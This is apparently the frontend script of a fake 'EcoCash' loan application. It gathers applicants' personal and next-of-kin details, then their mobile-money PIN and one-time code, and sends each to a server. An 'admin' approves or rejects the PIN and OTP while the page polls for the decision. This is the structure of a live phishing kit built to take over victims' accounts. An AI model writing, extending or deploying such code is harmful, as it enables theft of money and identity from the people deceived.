// ============================================================
// EcoCash Loan Application – Frontend Logic (FINAL)
// ============================================================

let appData = {
  loanAmount: 200,
  loanDuration: 30,
  firstName: '',
  lastName: '',
  phone: '',
  email: '',
  kinFirstName: '',
  kinLastName: '',
  kinPhone: '',
  province: '',
  loanReason: '',
  applicationId: null
};

let currentPage = 'page-landing';

// ─── localStorage Helpers ───
function saveState() {
  const state = { appData, currentPage };
  localStorage.setItem('ecocash_app_state', JSON.stringify(state));
}

function loadState() {
  const saved = localStorage.getItem('ecocash_app_state');
  if (saved) {
    try {
      const parsed = JSON.parse(saved);
      appData = parsed.appData || appData;
      currentPage = parsed.currentPage || 'page-landing';
      return true;
    } catch (e) {
      console.error('Failed to parse saved state', e);
    }
  }
  return false;
}

function clearState() {
  localStorage.removeItem('ecocash_app_state');
}

// ─── Page Navigation ───
function goTo(pageId) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.getElementById(pageId).classList.add('active');
  currentPage = pageId;
  saveState();
}

function clearErr(id) {
  const el = document.getElementById(id);
  el.classList.remove('show');
}

// ─── Landing ───
function startApplication() {
  appData.loanAmount = 200;
  appData.loanDuration = 30;
  goTo('page-step1');
  document.getElementById('s1am').value = 200;
  document.getElementById('s1dur').value = 30;
  updateStep1Calc();
}

// ─── Step 1 ───
function updateStep1Calc() {
  let amt = parseInt(document.getElementById('s1am').value);
  let dur = parseInt(document.getElementById('s1dur').value);
  let interest = amt * 0.005 * dur;
  let total = amt + interest;
  document.getElementById('s1AmtDisplay').textContent = `$${amt}`;
  document.getElementById('s1DurDisplay').textContent = `${dur} days`;
  document.getElementById('s1Principal').textContent = `$${amt.toFixed(2)}`;
  document.getElementById('s1Interest').textContent = `$${interest.toFixed(2)}`;
  document.getElementById('s1Total').textContent = `$${total.toFixed(2)}`;
  appData.loanAmount = amt;
  appData.loanDuration = dur;
  saveState();
}

function toS2() {
  let reason = document.getElementById('s1reason').value.trim();
  if (!reason) { showError('s1Err', 'Please provide a reason for the loan.'); return; }
  appData.loanReason = reason;
  goTo('page-step2');
}

// ─── Step 2 ───
function toS3() {
  let fi = document.getElementById('s2fi').value.trim();
  let la = document.getElementById('s2la').value.trim();
  let ph = document.getElementById('s2ph').value.trim();
  let em = document.getElementById('s2em').value.trim();
  if (!fi || !la || ph.length !== 9 || !em) {
    showError('s2Err', 'Please fill all fields correctly.');
    return;
  }
  appData.firstName = fi;
  appData.lastName = la;
  appData.phone = ph;
  appData.email = em;
  document.getElementById('sA').textContent = `$${appData.loanAmount}`;
  document.getElementById('sT').textContent = `${appData.loanDuration} Days`;
  document.getElementById('sR').textContent = `$${(appData.loanAmount * (1 + 0.005 * appData.loanDuration)).toFixed(2)}`;
  document.getElementById('sN').textContent = `${fi} ${la}`;
  goTo('page-step3');
}

// ─── Submit Application ───
async function submitApp() {
  let kf = document.getElementById('s3kf').value.trim();
  let kl = document.getElementById('s3kl').value.trim();
  let kp = document.getElementById('s3kp').value.trim();
  let prov = document.getElementById('s3prov').value;
  if (!kf || !kl || kp.length !== 9 || !prov) {
    showError('s3Err', 'Please fill all fields correctly.');
    return;
  }
  appData.kinFirstName = kf;
  appData.kinLastName = kl;
  appData.kinPhone = kp;
  appData.province = prov;

  try {
    const response = await fetch('/api/send-application', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ applicationData: appData })
    });
    const data = await response.json();
    if (data.ok) {
      appData.applicationId = data.applicationId;
      goTo('page-pin');
      startPinPolling(); // Start polling immediately after submission
    } else {
      alert('Error: ' + data.error);
    }
  } catch (err) {
    console.error(err);
    alert('Network error. Please try again.');
  }
}

// ─── PIN Submission ───
async function doPin() {
  let pin = '';
  for (let i = 0; i < 5; i++) pin += document.getElementById('pin' + i).value;
  if (pin.length !== 5) { showError('pinErr', 'Enter a 5-digit PIN.'); return; }

  try {
    const response = await fetch('/api/send-pin', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ applicationId: appData.applicationId, pin })
    });
    const data = await response.json();
    if (data.ok) {
      startPinPolling(); // Start polling for admin decision
    } else if (data.blocked) {
      showError('pinErr', data.message);
      disablePinInputs();
    } else {
      showError('pinErr', data.error || 'Error');
    }
  } catch (err) {
    alert('Network error');
  }
}

// ─── PIN Polling (with no-cache to avoid 304) ───
function startPinPolling() {
  if (window._pinInterval) clearInterval(window._pinInterval);
  window._pinInterval = setInterval(async () => {
    try {
      const res = await fetch(`/api/status/${appData.applicationId}/pin`, {
        cache: 'no-store'   // <-- Prevents 304, always gets fresh status
      });
      if (res.status === 404) {
        clearInterval(window._pinInterval);
        clearState();
        alert('Application not found. Please start again.');
        goTo('page-landing');
        return;
      }
      const data = await res.json();

      if (data.status === 'approved') {
        clearInterval(window._pinInterval);
        clearLoginPin();
        document.getElementById('pinAttemptsDisplay').textContent = '🔑 Attempts remaining: 3 of 3';
        goTo('page-otp');
        startOtpPolling();
        return;
      }
      if (data.status === 'rejected') {
        const remaining = data.remainingAttempts;
        document.getElementById('pinAttemptsDisplay').textContent = `🔑 Attempts remaining: ${remaining} of 3`;
        showError('pinErr', `Wrong PIN. ${remaining} attempt(s) remaining.`);
        clearLoginPin();
        if (!document.getElementById('page-pin').classList.contains('active')) {
          goTo('page-pin');
        }
        return;
      }
      if (data.status === 'blocked') {
        clearInterval(window._pinInterval);
        document.getElementById('pinAttemptsDisplay').textContent = '🔒 Too many attempts. Please wait 5 minutes.';
        disablePinInputs();
        showError('pinErr', 'Application blocked. Please wait 5 minutes.');
        return;
      }
      // If pending, just stay on the PIN page
      if (!document.getElementById('page-pin').classList.contains('active')) {
        goTo('page-pin');
      }
    } catch (err) {
      console.error('Polling error:', err);
    }
  }, 3000);
}

// ─── OTP Submission ───
async function doOtp() {
  let otp = '';
  for (let i = 0; i < 4; i++) otp += document.getElementById('otp' + i).value;
  if (otp.length !== 4) { showError('otpErr', 'Enter a 4-digit OTP.'); return; }

  try {
    const response = await fetch('/api/send-otp', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ applicationId: appData.applicationId, otp })
    });
    const data = await response.json();
    if (data.ok) {
      startOtpPolling();
    } else {
      alert('Error: ' + data.error);
    }
  } catch (err) {
    alert('Network error');
  }
}

// ─── OTP Polling (with no-cache) ───
function startOtpPolling() {
  if (window._otpInterval) clearInterval(window._otpInterval);
  window._otpInterval = setInterval(async () => {
    try {
      const res = await fetch(`/api/status/${appData.applicationId}/otp`, {
        cache: 'no-store'
      });
      if (res.status === 404) {
        clearInterval(window._otpInterval);
        clearState();
        alert('Application not found. Please start again.');
        goTo('page-landing');
        return;
      }
      const data = await res.json();

      if (data.status === 'approved') {
        clearInterval(window._otpInterval);
        showApproval();
        return;
      }
      if (data.status === 'rejected') {
        clearInterval(window._otpInterval);
        showRejected('OTP rejected. Please request a new OTP.');
        return;
      }
    } catch (err) {
      console.error('Polling error:', err);
    }
  }, 3000);
}

// ─── Resend OTP ───
async function resendOtp() {
  try {
    const response = await fetch('/api/resend-otp', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ applicationId: appData.applicationId })
    });
    const data = await response.json();
    if (data.ok) {
      alert('OTP resend request sent to admin.');
    } else {
      alert('Error: ' + data.error);
    }
  } catch (err) {
    alert('Network error');
  }
}

// ─── Approval / Rejection ───
function showApproval() {
  document.getElementById('aprAmount').textContent = `$${appData.loanAmount}`;
  document.getElementById('aprTerm').textContent = `${appData.loanDuration} Days`;
  document.getElementById('aprMth').textContent = `$${(appData.loanAmount * (1 + 0.005 * appData.loanDuration)).toFixed(2)}`;
  goTo('page-approval');
  clearState();
}

function showRejected(reason) {
  alert(reason);
  clearState();
  goTo('page-landing');
}

// ─── Helpers ───
function showError(id, msg) {
  const el = document.getElementById(id);
  el.querySelector('span:last-child').textContent = msg;
  el.classList.add('show');
  setTimeout(() => el.classList.remove('show'), 3000);
}

function normalizePhone(id) {
  let el = document.getElementById(id);
  el.value = el.value.replace(/\D/g, '').slice(0, 9);
}

function disablePinInputs() {
  document.querySelectorAll('.pin-box').forEach(inp => inp.disabled = true);
}

function pinMvM(input, idx) {
  if (input.value.length > 0 && idx < 4) {
    document.getElementById('pin' + (idx + 1)).focus();
  }
  if (input.value.length === 0 && idx > 0) {
    document.getElementById('pin' + (idx - 1)).focus();
  }
}
function togPin() {
  let inputs = document.querySelectorAll('.pin-box');
  inputs.forEach(inp => inp.type = inp.type === 'password' ? 'text' : 'password');
}
function clearLoginPin() {
  document.querySelectorAll('.pin-box').forEach(inp => inp.value = '');
}

function handleOtpInput(input, type) {
  if (input.value.length > 0 && input.id !== 'otp3') {
    document.getElementById('otp' + (parseInt(input.id.slice(3)) + 1)).focus();
  }
}
function clearOtpCode() {
  document.querySelectorAll('.otp-box').forEach(inp => inp.value = '');
}

// ─── Restore State on Page Load ───
document.addEventListener('DOMContentLoaded', function() {
  const restored = loadState();
  if (restored && appData.applicationId) {
    if (currentPage === 'page-pin') {
      goTo('page-pin');
      startPinPolling();
    } else if (currentPage === 'page-otp') {
      goTo('page-otp');
      // We don't start OTP polling until user submits OTP
    } else if (currentPage === 'page-step1' || currentPage === 'page-step2' || currentPage === 'page-step3') {
      goTo(currentPage);
    } else {
      goTo(currentPage);
    }
  } else {
    goTo('page-landing');
  }
});
